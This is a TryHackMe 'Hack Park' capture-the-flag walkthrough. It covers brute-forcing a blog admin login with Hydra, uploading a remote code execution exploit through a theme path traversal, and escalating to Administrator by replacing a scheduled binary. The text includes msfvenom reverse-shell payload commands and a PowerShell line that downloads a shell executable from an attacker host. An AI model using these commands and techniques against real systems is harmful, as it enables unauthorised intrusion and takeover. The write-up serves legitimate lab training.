# This is a writeup of: Hack Park from TryHackMe
## Difficulty: Medium

---

Name: Alexander Spiesberger   
Contact: alex.spiesberger@gmail.com  
Date: 3 March 2021

---

![CTF](assets/1.png)

We first start, as always with the scan, nmap, gobuster and nikto:   

![scanning](assets/2.png)

While waiting for the scan to end, we can look a bit around on the website.   
We find a login, a contact form and other stuff.   
Gobuster and Nikto both found a robots.txt file, we go and take a look at it, but nothing too crazy.   
On the task they tell us to brute force the login, I actually don't find any credentials, so I must admit I took the hint.  
So I know now, that the username is admin.  
To brute it, I intercept the request with burp: 

![brutpsuite](assets/3.png)

You can then copy what can be seen in the screenshot.   
We will feed this to hydra:   

![hydra](assets/4.png)

Quick explaination of what is done here:   
- First change is to were the file is (color: red)
- Second change is to the USER (color: green)
- Third change is to PASS (color: blue)
- Last change is the error message (color: yellow)

![error msg](assets/error.png)

With the hydra launched, we get back a password, YAY:

![pass](assets/5.png)

We can now connect to it:

![connection](assets/6.png)

So, we are now connected to a CMS as, normally admin.   
We search a version number, and find one in the about section:  

![version](assets/7.png)

We find on searchsploit a remote code execution for this version.  
We copy it to our folder and see what it does:   

![searchsploit](assets/8.png)

It is really well explained in the file, so I do what they say:  

![file](assets/9.png)

- We change the IP and PORT.      
- We rename it: *"PostView.ascx"* 
- And we then have to upload our file:
  1) we go to *"published posts"*
  2) open the post *"Welcome to HackPark"* 
  3) click on the file manager (open file symbol)
  4) We upload our file named: *"PostView.ascx"*
- Then go to this link with a listener running, it should trigger it: http://<IP>/?theme=../../App_Data/files

![url](assets/10.png)

The listener that gives us our shell:   

![listener](assets/11.png)

Ok, we are now connected to the machine.   
We, we can now take the way with metasploit or without.
Without metasploit, you can create a payload to get a more stable shell, possible payloads:   
- *msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP> LPORT=<PORT> -f exe -o test.exe*
  
Then just pull it with powershell or other technique to a writable directory:
- powershell -c "Invoke-WebRequest -Uri '<ip>:<port>/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

I will do it here with metasploit to get a meterpreter and then continue in a way that works for both.     
Payload:   
- *"msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe"*

![payload](assets/12.png)

I then download it to the other machine by setting a pyton server and downloading it with another method:  

![certutil](assets/13.png)

I then set up my multi/handler to get my meterpreter shell back:   

![multi/handler](assets/14.png)

We launch the exectubale ... and, we get our meterpreter:   

![meterreter](assets/15.png)

Ok I will now upload winPEAS to find a way to escalate, because we are still *"IIS APPPOOL\Blog"*.   

![upload winpeas](assets/16.png)

We can then launch it:   

![winPEAS](assets/17.png)

After looking a bit I found a service running that looked interesting:   

![windowsScheduler](assets/18.png)

So I went to *"C:\Program Files (x86)\SystemScheduler"*, continued to the only directory: *"Events"* and downloaded the only txt file:  

![downlaod](assets/19.png)

We then read the log file and see that it calls a process, *"Message.exe"* as Administrator:   

![log file](assets/20.png)

So I went to take a look at the binary, maybe we can delete it to replace it with another file that would have a payload.   
But we can't, It took me some time to understand that I could just rename it...   
So I did this, I renamed the file and created a new one and hoped that I could upload a new file with the name *"Message.exe"* to this location:   
We could here actually just rename the older file and exit the meterpreter shell, create a new one, and get root.   
And it would clearly be better to have a meterpreter.        

![payload](assets/21.png)

Anyway, we upload this, rename the last file and set up a listener:

![upload](assets/22.png)

The only thing to do now, is to wait and let the magic happen!  

![magic](assets/23.png)

The magic happened, and we are now Administrator, we can go and read all the flags:    

![jeff](assets/24.png)

![Administrator](assets/25.png)

And, we are now done with all those sweet flags.   

----

I hope you enjoyed my walkthrough and that is was clear.   
For any questions regarding this CTF or any other subject this is my email: alex.spiesberger@gmail.com   
 


